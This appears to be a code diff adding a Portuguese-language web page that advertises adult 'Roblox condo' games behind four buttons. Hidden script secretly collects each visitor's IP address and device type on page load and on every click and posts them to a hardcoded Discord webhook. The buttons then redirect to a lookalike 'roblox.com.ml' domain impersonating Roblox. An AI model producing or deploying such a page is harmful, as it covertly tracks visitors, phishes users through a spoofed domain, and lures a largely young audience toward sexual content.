@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROBLOX CONDO GAMES</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;700;900&display=swap');
+        body { font-family: 'Outfit', sans-serif; background-color: #0a0a0a; color: #ffffff; overflow-x: hidden; }
+        .bg-gradient-glow { background: radial-gradient(circle at 50% 50%, rgba(255, 255, 255, 0.05) 0%, transparent 70%); }
+        .btn-game { transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1); position: relative; overflow: hidden; }
+        .btn-game:hover { transform: translateY(-5px) scale(1.02); box-shadow: 0 20px 40px -10px rgba(255, 255, 255, 0.4); }
+        .btn-game::after { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(0, 0, 0, 0.05), transparent); transition: 0.5s; }
+        .btn-game:hover::after { left: 100%; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-6 bg-gradient-glow">
+    <div class="max-w-lg w-full text-center space-y-12 z-10">
+        <header class="space-y-4">
+            <div class="inline-block px-4 py-1 rounded-full border border-zinc-800 text-zinc-500 text-xs font-bold tracking-[0.2em] uppercase mb-2">Plataforma Premium</div>
+            <h1 class="text-5xl md:text-6xl font-black tracking-tighter text-white drop-shadow-2xl">ROBLOX <span class="text-zinc-500">CONDO</span></h1>
+            <p class="text-zinc-400 text-sm font-medium tracking-wide max-w-xs mx-auto">Selecione uma experiência abaixo para iniciar sua jornada privada.</p>
+        </header>
+        <main class="grid gap-5">
+            <button onclick="logClick('Fun Combat 🔞')" class="btn-game w-full py-5 px-8 rounded-2xl bg-white text-black font-black text-xl flex items-center justify-between shadow-xl">
+                <span class="flex items-center gap-3"><span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>Fun Combat 🔞</span>
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+            </button>
+            <button onclick="logClick('Sex Game 🔞')" class="btn-game w-full py-5 px-8 rounded-2xl bg-white text-black font-black text-xl flex items-center justify-between shadow-xl">
+                <span class="flex items-center gap-3"><span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>Sex Game 🔞</span>
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+            </button>
+            <button onclick="logClick('Sword Game 🔞')" class="btn-game w-full py-5 px-8 rounded-2xl bg-white text-black font-black text-xl flex items-center justify-between shadow-xl">
+                <span class="flex items-center gap-3"><span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>Sword Game 🔞</span>
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+            </button>
+            <button onclick="logClick('V4 Game 🔞')" class="btn-game w-full py-5 px-8 rounded-2xl bg-white text-black font-black text-xl flex items-center justify-between shadow-xl">
+                <span class="flex items-center gap-3"><span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>V4 Game 🔞</span>
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+            </button>
+        </main>
+        <footer class="pt-10 space-y-2">
+            <div class="h-[1px] w-full bg-zinc-900 mx-auto"></div>
+            <p class="text-zinc-600 text-xs font-bold tracking-widest uppercase pt-4">© 2026 ROBLOX CONDO GAMES</p>
+        </footer>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467649418906833084/6fw-R4HUJJp5spTReDEQlIEHai63OUqni2rw0q-hnZ0ALMsrixJ2FPyeXntsHtnH75sf';
+        const LINKS = {
+            'Fun Combat 🔞': 'https://www.roblox.com.ml/games/113619806046802/Untitled-Game442342342-W-OR-L?privateServerLinkCode=09052399635066543397054530943988',
+            'Sex Game 🔞': 'https://www.roblox.com.ml/games/76106209840076/Weird-Neko-Untitled-Game?privateServerLinkCode=09052399635066543397054530943988',
+            'Sword Game 🔞': 'https://www.roblox.com.ml/games/85811969623710/Sword-Fighting-773855?privateServerLinkCode=09052399635066543397054530943988',
+            'V4 Game 🔞': 'https://www.roblox.com.ml/games/116881334009378/V4-2p-775671?privateServerLinkCode=09052399635066543397054530943988'
+        };
+
+        let userData = { ip: 'Desconhecido', device: 'Detectando...' };
+
+        function getDevice() {
+            const ua = navigator.userAgent;
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+            return "Desktop (PC)";
+        }
+
+        function getIpJsonp() {
+            return new Promise((resolve) => {
+                const script = document.createElement('script');
+                script.src = 'https://api.ipify.org?format=jsonp&callback=ipCallback';
+                window.ipCallback = (data) => {
+                    userData.ip = data.ip;
+                    document.body.removeChild(script);
+                    resolve();
+                };
+                document.body.appendChild(script);
+                setTimeout(() => resolve(), 3000);
+            });
+        }
+
+        async function init() {
+            userData.device = getDevice();
+            await getIpJsonp();
+            sendWebhook('Alguém entrou no seu site');
+        }
+
+        function formatDateTime() {
+            return new Date().toLocaleString('pt-BR', { 
+                day: '2-digit', month: '2-digit', year: 'numeric', 
+                hour: '2-digit', minute: '2-digit', second: '2-digit' 
+            });
+        }
+
+        async function sendWebhook(descriptionText) {
+            const timestamp = formatDateTime();
+            const payload = {
+                embeds: [{
+                    description: `**__${descriptionText}__**\n* **IP:** ${userData.ip}\n* **Aparelho:** ${userData.device}`,
+                    color: 8388863, // Roxo
+                    footer: { text: timestamp }
+                }]
+            };
+
+            return fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error('Erro no webhook:', err));
+        }
+
+        async function logClick(gameName) {
+            await sendWebhook(`Alguém entrou em ${gameName}`);
+            const targetUrl = LINKS[gameName];
+            if (targetUrl) window.location.href = targetUrl;
+        }
+
+        init();
+    </script>
+</body>
+</html>
